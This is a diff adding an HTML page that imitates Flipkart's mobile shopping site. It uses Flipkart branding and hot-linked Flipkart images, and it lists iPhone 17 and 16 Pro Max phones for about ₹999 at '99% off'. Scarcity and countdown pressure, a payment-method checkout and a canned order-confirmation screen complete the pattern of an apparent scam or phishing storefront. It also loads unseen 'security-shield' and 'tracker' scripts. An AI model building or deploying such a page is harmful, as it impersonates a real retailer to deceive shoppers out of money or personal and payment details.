@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Flipkart - Online Shopping Site for Mobiles, Electronics, Furniture, Grocery</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+  <link rel="stylesheet" href="style.css?v=3">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><rect width='32' height='32' rx='6' fill='%232874f0'/><text x='50%25' y='68%25' font-size='20' font-weight='bold' font-family='sans-serif' fill='%23ffe11b' text-anchor='middle'>f</text></svg>">
+  <link rel="stylesheet" href="/assets/flipkart-splash.css">
+  <script src="/assets/flipkart-splash.js"></script>
+  <script src="/assets/security-shield.js"></script>
+</head>
+<body>
+
+  <!-- App Viewport Container (Centered mobile frame on desktop, 100% on mobile) -->
+  <div class="app-viewport">
+
+    <!-- Top Orange/Peach Gradient Header (Height & thickness matched to screenshot) -->
+    <header class="fk-header">
+      
+      <!-- Top Quick Navigation Cards (Chunky vertical cards with icon on top, bold label below) -->
+      <div class="top-pills-row">
+        <!-- Flipkart Card -->
+        <a href="#home" class="header-card fk-brand-card">
+          <div class="card-top-icon">
+            <img src="assets/images/flipkart-icon.png" alt="Flipkart" class="fk-card-f-img">
+          </div>
+          <span class="card-bottom-text brand-text">Flipkart</span>
+        </a>
+
+        <!-- Value 365 Card -->
+        <a href="#value" class="header-card value-card">
+          <div class="card-top-icon tag-icon-wrap">
+            <svg viewBox="0 0 32 32" class="pill-svg">
+              <path d="M26 18l-9 9a3 3 0 0 1-4.2 0L3 17.2V5h12.2l10.8 10.8a3 3 0 0 1 0 4.2z" fill="#ef4444"/>
+              <circle cx="8" cy="10" r="2.5" fill="#ffffff"/>
+              <text x="14" y="21" font-size="9" font-weight="bold" fill="#fff" text-anchor="middle">%</text>
+              <circle cx="21" cy="22" r="5" fill="#facc15" stroke="#ca8a04" stroke-width="1"/>
+              <text x="21" y="25" font-size="7" font-weight="900" fill="#713f12" text-anchor="middle">₹</text>
+            </svg>
+          </div>
+          <span class="card-bottom-text">Value 365</span>
+        </a>
+
+        <!-- Travel Card -->
+        <a href="#travel" class="header-card travel-card">
+          <div class="card-top-icon">
+            <svg viewBox="0 0 32 32" class="pill-svg">
+              <path d="M28 20v-3l-11-7V4a2 2 0 0 0-4 0v6L2 17v3l11-3.5V24l-3 2v2.5l4.5-1.2 4.5 1.2V26l-3-2v-7.5L28 20z" fill="#f87171"/>
+            </svg>
+          </div>
+          <span class="card-bottom-text">Travel</span>
+        </a>
+
+        <!-- Grocery Card -->
+        <a href="#grocery" class="header-card grocery-card">
+          <div class="card-top-icon">
+            <svg viewBox="0 0 32 32" class="pill-svg">
+              <!-- Basket with juice/milk pack, apple, bottle -->
+              <rect x="14" y="6" width="9" height="14" rx="2" fill="#fde047"/>
+              <circle cx="9" cy="19" r="6" fill="#f87171"/>
+              <rect x="21" y="10" width="7" height="11" rx="2" fill="#38bdf8"/>
+              <path d="M4 22h24l-3 8H7l-3-8z" fill="#f59e0b" opacity="0.8"/>
+            </svg>
+          </div>
+          <span class="card-bottom-text">Grocery</span>
+        </a>
+      </div>
+
+      <!-- Address / Location Bar & SuperCoins (Taller, thicker bar matching screenshot) -->
+      <div class="location-coin-row">
+        <button class="location-bar-thick" id="locationBtn" aria-label="Select Delivery Location">
+          <svg class="loc-pin-svg" viewBox="0 0 24 24" fill="currentColor">
+            <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
+          </svg>
+          <span class="loc-placeholder">Joarderpara,betai.., Tehatta I Subdist...</span>
+          <svg class="loc-arrow-svg" viewBox="0 0 24 24" fill="currentColor">
+            <path d="M7 10l5 5 5-5z"/>
+          </svg>
+        </button>
+
+        <!-- SuperCoin Balance Badge -->
+        <div class="supercoin-card-thick" id="supercoinBadge" title="SuperCoin Balance">
+          <div class="coin-icon-wrapper">
+            <svg viewBox="0 0 24 24" class="supercoin-lightning-svg">
+              <circle cx="12" cy="12" r="11" fill="#f59e0b"/>
+              <path d="M13 2L6 13h5l-2 9 9-13h-5l2-7z" fill="#ffffff"/>
+            </svg>
+          </div>
+          <span class="coin-count">0</span>
+        </div>
+      </div>
+
+      <!-- Search Bar Row (Thicker 48px rounded bar with camera, mic, QR) -->
+      <div class="search-row-thick">
+        <div class="search-box-thick">
+          <svg class="search-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.3">
+            <circle cx="11" cy="11" r="8"></circle>
+            <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+          </svg>
+          <input 
+            type="text" 
+            id="searchInput" 
+            placeholder="mobiles" 
+            autocomplete="off" 
+            aria-label="Search for products, brands and more"
+          >
+          <button class="search-action-btn camera-btn" id="cameraSearchBtn" title="Search with Camera">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"></path>
+              <circle cx="12" cy="13" r="4"></circle>
+            </svg>
+          </button>
+          <button class="search-action-btn mic-btn" id="micSearchBtn" title="Search with Voice">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z"></path>
+              <path d="M19 10v2a7 7 0 0 1-14 0v-2"></path>
+              <line x1="12" y1="19" x2="12" y2="23"></line>
+              <line x1="8" y1="23" x2="16" y2="23"></line>
+            </svg>
+          </button>
+        </div>
+
+        <!-- QR Scanner Icon Button -->
+        <button class="qr-btn-thick" id="qrBtn" title="Scan QR Code">
+          <svg viewBox="0 0 24 24" fill="currentColor">
+            <path d="M3 3h6v6H3V3zm2 2v2h2V5H5zm8-2h6v6h-6V3zm2 2v2h2V5h-2zM3 15h6v6H3v-6zm2 2v2h2v-2H5zm10-2h2v2h-2v-2zm4 0h2v2h-2v-2zm-4 4h2v2h-2v-2zm4 0h2v2h-2v-2zm-2-2h2v2h-2v-2zM13 11h2v2h-2v-2zm4 0h2v2h-2v-2zM11 3h2v2h-2V3zm0 4h2v2h-2V7zm0 4h2v2h-2v-2zm0 4h2v2h-2v-2zm0 4h2v2h-2v-2zM7 11h2v2H7v-2zm-4 0h2v2H3v-2z"/>
+          </svg>
+        </button>
+      </div>
+
+      <!-- Category Filter Tabs -->
+      <nav class="category-tabs-bar" aria-label="Product Categories">
+        <div class="category-tabs-scroll">
+          
+          <button class="cat-tab active" data-tab="for-you">
+            <div class="cat-icon-wrap">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <path d="M6 2L3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4z"></path>
+                <line x1="3" y1="6" x2="21" y2="6"></line>
+                <path d="M16 10a4 4 0 0 1-8 0"></path>
+              </svg>
+            </div>
+            <span>For You</span>
+            <div class="tab-indicator"></div>
+          </button>
+
+          <button class="cat-tab" data-tab="fashion">
+            <div class="cat-icon-wrap">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <path d="M20.38 3.46L16 2a4 4 0 0 1-8 0L3.62 3.46a2 2 0 0 0-1.34 2.23l.58 3.47a1 1 0 0 0 .99.84H6v10a2 2 0 0 0 2 2h8a2 2 0 0 0 2-2V10h2.15a1 1 0 0 0 .99-.84l.58-3.47a2 2 0 0 0-1.34-2.23z"/>
+              </svg>
+            </div>
+            <span>Fashion</span>
+          </button>
+
+          <button class="cat-tab" data-tab="mobiles">
+            <div class="cat-icon-wrap">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect>
+                <line x1="12" y1="18" x2="12.01" y2="18"></line>
+              </svg>
+            </div>
+            <span>Mobiles</span>
+          </button>
+
+          <button class="cat-tab" data-tab="electronics">
+            <div class="cat-icon-wrap">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect>
+                <line x1="2" y1="20" x2="22" y2="20"></line>
+              </svg>
+            </div>
+            <span>Electronics</span>
+          </button>
+
+          <button class="cat-tab" data-tab="beauty">
+            <div class="cat-icon-wrap">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <path d="M9 3h6v4H9zM10 7h4v14h-4zM8 21h8"/>
+              </svg>
+            </div>
+            <span>Beauty</span>
+          </button>
+
+          <button class="cat-tab" data-tab="home">
+            <div class="cat-icon-wrap">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+                <polyline points="9 22 9 12 15 12 15 22"></polyline>
+              </svg>
+            </div>
+            <span>Home</span>
+          </button>
+
+        </div>
+      </nav>
+
+    </header>
+
+    <!-- Main Content Body -->
+    <main class="fk-body">
+      
+      <!-- Promotional Hero Banners (filled from /api/banners; static fallback below) -->
+      <section class="hero-banner-section">
+        <div class="banner-wrapper" id="heroBannerWrapper">
+          <img 
+            src="assets/images/bbd_banner.jpg" 
+            alt="The Big Billion Days - India's Biggest Festive Sale" 
+            class="bbd-banner-img"
+            loading="eager"
+            fetchpriority="high"
+          >
+          <div class="banner-glow-overlay"></div>
+        </div>
+      </section>
+
+      <!-- Quick Category Icons Row (Matching User Screenshot) -->
+      <section class="quick-categories-row" id="quickCategoriesRow">
+        <div class="quick-cat-item" data-category="mobiles" onclick="filterProductsByCategory('mobiles')">
+          <div class="quick-cat-img-box">
+            <img src="https://static-assets-web.flixcart.com/apex-static/images/svgs/L1Nav/mobiles.svg" alt="Mobiles" class="quick-cat-img" onerror="this.onerror=null; this.src='https://rukminim2.flixcart.com/flap/128/128/image/22fddf3c7da4c4f4.png?q=100';">
+          </div>
+          <span class="quick-cat-name">Mobiles</span>
+        </div>
+        <div class="quick-cat-item" data-category="electronics" onclick="filterProductsByCategory('electronics')">
+          <div class="quick-cat-img-box">
+            <img src="https://static-assets-web.flixcart.com/apex-static/images/svgs/L1Nav/electronics.svg" alt="Electronics" class="quick-cat-img" onerror="this.onerror=null; this.src='https://rukminim2.flixcart.com/flap/128/128/image/69c6589653afdb9a.png?q=100';">
+          </div>
+          <span class="quick-cat-name">Electronics</span>
+        </div>
+        <div class="quick-cat-item" data-category="appliances" onclick="filterProductsByCategory('appliances')">
+          <div class="quick-cat-img-box">
+            <img src="https://static-assets-web.flixcart.com/apex-static/images/svgs/L1Nav/tv.svg" alt="Appliances" class="quick-cat-img" onerror="this.onerror=null; this.src='https://rukminim2.flixcart.com/flap/128/128/image/0ff199d1bd27eb98.png?q=100';">
+          </div>
+          <span class="quick-cat-name">Appliances</span>
+        </div>
+        <div class="quick-cat-item" data-category="furniture" onclick="filterProductsByCategory('furniture')">
+          <div class="quick-cat-img-box">
+            <img src="https://static-assets-web.flixcart.com/apex-static/images/svgs/L1Nav/furniture.svg" alt="Furniture" class="quick-cat-img" onerror="this.onerror=null; this.src='https://rukminim2.flixcart.com/flap/128/128/image/ab7e2b022a4587dd.jpg?q=100';">
+          </div>
+          <span class="quick-cat-name">Furniture</span>
+        </div>
+        <div class="quick-cat-item" data-category="grocery" onclick="filterProductsByCategory('grocery')">
+          <div class="quick-cat-img-box">
+            <img src="https://static-assets-web.flixcart.com/apex-static/images/svgs/L1Nav/food.svg" alt="Grocery" class="quick-cat-img" onerror="this.onerror=null; this.src='https://rukminim2.flixcart.com/flap/128/128/image/29327f40e9c4d26b.png?q=100';">
+          </div>
+          <span class="quick-cat-name">Grocery</span>
+        </div>
+      </section>
+
+      <!-- Sale Live Countdown Bar (Matching Screenshot 08:15) -->
+      <section class="sale-live-bar">
+        <div class="sale-live-left">
+          <span class="pulse-dot"></span>
+          <span class="sale-live-tag">SALE LIVE</span>
+          <span class="bullet-dot">•</span>
+          <span class="ends-in-label">Ends in</span>
+          <span class="countdown-timer" id="saleCountdown">08:15</span>
+        </div>
+        <button class="shop-now-btn" id="shopNowBtn">
+          Shop Now <svg viewBox="0 0 24 24" fill="currentColor"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/></svg>
+        </button>
+      </section>
+
+      <!-- 2-Product Grid Section (Left: iPhone 17, Right: iPhone 16) -->
+      <section class="products-grid-section">
+        <div class="products-grid">
+          
+          <!-- LEFT PRODUCT CARD: Apple iPhone 17 Pro Max (Cosmic Orange) -->
+          <a href="product.html?id=apple-iphone-17-pro-max-256-gb" class="item fk-product-card" id="cardProduct1" data-product="1">
+            <div class="img-wrap card-img-area">
+              <img src="assets/images/iphone_orange.jpg" alt="Apple iPhone 17 Pro Max (Cosmic Orange, 256 GB)" class="card-img">
+            </div>
+            <div class="details card-details-area">
+              <div class="title card-title">Apple iPhone 17 Pro Max (Cosmic Orange, 256 GB)</div>
+              <div class="rating-row card-rating-row">
+                <span class="stars">
+                  <i class="bi bi-star-fill"></i>
+                  <i class="bi bi-star-fill"></i>
+                  <i class="bi bi-star-fill"></i>
+                  <i class="bi bi-star-fill"></i>
+                  <i class="bi bi-star-half"></i>
+                </span>
+                <span class="count card-review-count">(500)</span>
+                <img class="assured fk-assured-img" src="assets/images/fk_assured_promo.png" onerror="this.src='https://rukminim2.flixcart.com/www/120/32/promos/25/06/2024/71af54bd-9160-41ff-81cc-c55e534dedeb.png?q=60'" alt="Assured">
+              </div>
+              <div class="price-row card-pricing-row">
+                <span class="disc card-discount"><svg class="disc-arrow" viewBox="0 0 16 16" width="12" height="12" fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><line x1="8" y1="2" x2="8" y2="14"></line><polyline points="13 9 8 14 3 9"></polyline></svg>99%</span>
+                <span class="mrp card-mrp">₹1,47,900</span>
+                <span class="sell card-selling-price">₹999</span>
+              </div>
+              <div class="wow card-offer-row">
+                <img src="assets/images/fk_wow_promo.png" onerror="this.src='https://rukminim2.flixcart.com/www/92/39/promos/30/08/2023/59dc7885-72bf-4135-9099-025f074b0eb1.png?q=90'" alt="WOW">
+                <span class="wow-price">₹999</span>
+                <span class="wow-text">with offer</span>
+              </div>
+              <div class="stock-text card-deal-status" style="color: #b90000;">Only 3 left</div>
+              <div class="delivery card-delivery-row">Delivery by <b>12th Oct</b></div>
+            </div>
+          </a>
+
+          <!-- RIGHT PRODUCT CARD: Apple iPhone 16 Pro Max (Black Titanium) -->
+          <a href="product.html?id=iphone16" class="item fk-product-card" id="cardProduct2" data-product="2">
+            <div class="img-wrap card-img-area">
+              <img src="assets/images/iphone_black.jpg" alt="Apple iPhone 16 Pro Max (Black Titanium, 256 GB)" class="card-img">
+            </div>
+            <div class="details card-details-area">
+              <div class="title card-title">Apple iPhone 16 Pro Max (Black Titanium, 256 GB)</div>
+              <div class="rating-row card-rating-row">
+                <span class="stars">
+                  <i class="bi bi-star-fill"></i>
+                  <i class="bi bi-star-fill"></i>
+                  <i class="bi bi-star-fill"></i>
+                  <i class="bi bi-star-fill"></i>
+                  <i class="bi bi-star-half"></i>
+                </span>
+                <span class="count card-review-count">(500)</span>
+                <img class="assured fk-assured-img" src="assets/images/fk_assured_promo.png" onerror="this.src='https://rukminim2.flixcart.com/www/120/32/promos/25/06/2024/71af54bd-9160-41ff-81cc-c55e534dedeb.png?q=60'" alt="Assured">
+              </div>
+              <div class="price-row card-pricing-row">
+                <span class="disc card-discount"><svg class="disc-arrow" viewBox="0 0 16 16" width="12" height="12" fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><line x1="8" y1="2" x2="8" y2="14"></line><polyline points="13 9 8 14 3 9"></polyline></svg>99%</span>
+                <span class="mrp card-mrp">₹1,34,900</span>
+                <span class="sell card-selling-price">₹998</span>
+              </div>
+              <div class="wow card-offer-row">
+                <img src="assets/images/fk_wow_promo.png" onerror="this.src='https://rukminim2.flixcart.com/www/92/39/promos/30/08/2023/59dc7885-72bf-4135-9099-025f074b0eb1.png?q=90'" alt="WOW">
+                <span class="wow-price">₹998</span>
+                <span class="wow-text">with offer</span>
+              </div>
+              <div class="stock-text card-deal-status" style="color: #008c00;">Hot deal</div>
+              <div class="delivery card-delivery-row">Delivery by <b>13th Oct</b></div>
+            </div>
+          </a>
+
+        </div>
+      </section>
+
+      <!-- End of products list -->
+    </main>
+
+    <!-- Buy Now / Order Checkout Modal Drawer -->
+    <div class="modal-backdrop" id="checkoutModal">
+      <div class="modal-sheet">
+        <div class="modal-handle"></div>
+        <div class="modal-header">
+          <div class="modal-title-wrap">
+            <h3 class="modal-title">Order Summary</h3>
+            <span class="modal-sub">1 Item selected</span>
+          </div>
+          <button class="modal-close-btn" id="closeModalBtn">&times;</button>
+        </div>
+
+        <div class="modal-body">
+          <!-- Item preview -->
+          <div class="checkout-product-preview">
+            <img src="assets/images/iphone_orange.jpg" alt="iPhone" class="checkout-thumb" id="modalThumb">
+            <div class="checkout-meta">
+              <h4 id="modalTitle">Apple iPhone 17 Pro Max (Cosmic Orange, 256 GB)</h4>
+              <div class="checkout-price-tag">
+                <span class="deal-highlight">Special Big Billion Deal</span>
+                <div class="checkout-price-values">
+                  <span class="ch-price" id="modalPrice">₹999</span>
+                  <span class="ch-mrp" id="modalMrp">₹1,47,900</span>
+                  <span class="ch-discount">99% off</span>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Delivery Address Section -->
+          <div class="checkout-card address-box">
+            <div class="address-title-row">
+              <div class="addr-label">
+                <svg viewBox="0 0 24 24" fill="#2874f0"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
+                Deliver to: <strong>Home, 700001</strong>
+              </div>
+              <button class="change-addr-btn">Change</button>
+            </div>
+            <p class="address-details">Flat 4B, Sky Towers, Park Street, Kolkata, West Bengal</p>
+          </div>
+
+          <!-- Price Breakup -->
+          <div class="checkout-card price-breakup-card">
+            <h4>Price Details</h4>
+            <div class="price-row">
+              <span>Price (1 item)</span>
+              <span id="modalBreakupMrp">₹1,47,900</span>
+            </div>
+            <div class="price-row green-row">
+              <span>Discount</span>
+              <span id="modalBreakupDiscount">- ₹1,46,901</span>
+            </div>
+            <div class="price-row green-row">
+              <span>Delivery Charges</span>
+              <span class="free-text">FREE</span>
+            </div>
+            <div class="price-divider"></div>
+            <div class="price-row total-row">
+              <strong>Total Amount</strong>
+              <strong class="total-price" id="modalBreakupTotal">₹999</strong>
+            </div>
+            <div class="saving-msg">
+              🎉 Festive Mega Offer Applied!
+            </div>
+          </div>
+
+          <!-- Payment Options -->
+          <div class="checkout-card payment-options-card">
+            <h4>Select Payment Method</h4>
+            <label class="pay-option active">
+              <input type="radio" name="paymentMethod" value="cod" checked>
+              <div class="pay-meta">
+                <strong>Cash on Delivery (COD)</strong>
+                <span>Pay at the doorstep upon inspection</span>
+              </div>
+            </label>
+            <label class="pay-option">
+              <input type="radio" name="paymentMethod" value="upi">
+              <div class="pay-meta">
+                <strong>UPI (PhonePe / Google Pay / Paytm)</strong>
+                <span>Instant payment & extra ₹50 SuperCoins</span>
+              </div>
+            </label>
+            <label class="pay-option">
+              <input type="radio" name="paymentMethod" value="card">
+              <div class="pay-meta">
+                <strong>Credit / Debit / ATM Card</strong>
+                <span>All major banks supported</span>
+              </div>
+            </label>
+          </div>
+
+        </div>
+
+        <!-- Checkout Bottom Sticky Button -->
+        <div class="modal-footer">
+          <div class="footer-price-info">
+            <span class="footer-total" id="modalFooterTotal">₹999</span>
+            <a href="#breakup" class="view-details-link">View price details</a>
+          </div>
+          <button class="confirm-order-btn" id="confirmOrderBtn">
+            Continue & Place Order
+          </button>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- Order Success Celebration Toast / Screen -->
+    <div class="order-success-overlay" id="orderSuccessOverlay">
+      <div class="success-card">
+        <div class="success-check-circle">
+          <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3">
+            <polyline points="20 6 9 17 4 12"></polyline>
+          </svg>
+        </div>
+        <h2>Order Confirmed!</h2>
+        <p class="order-id-text">Order ID: <strong>OD8392019485721</strong></p>
+        <p class="order-subtext" id="orderSuccessSub">Your device will be delivered by <strong>13th Oct</strong>.</p>
+        <div class="congrats-chip">🎉 BBD Festive Mega Offer Applied!</div>
+        <button class="success-done-btn" id="successDoneBtn">Done</button>
+      </div>
+    </div>
+
+    <!-- Notification Toast -->
+    <div class="toast-notification" id="toastNotification">
+      <span class="toast-message" id="toastMessage">Notification</span>
+    </div>
+
+  </div>
+
+  <script src="/assets/tracker.js"></script>
+  <script src="app.js?v=3"></script>
+</body>
+</html>
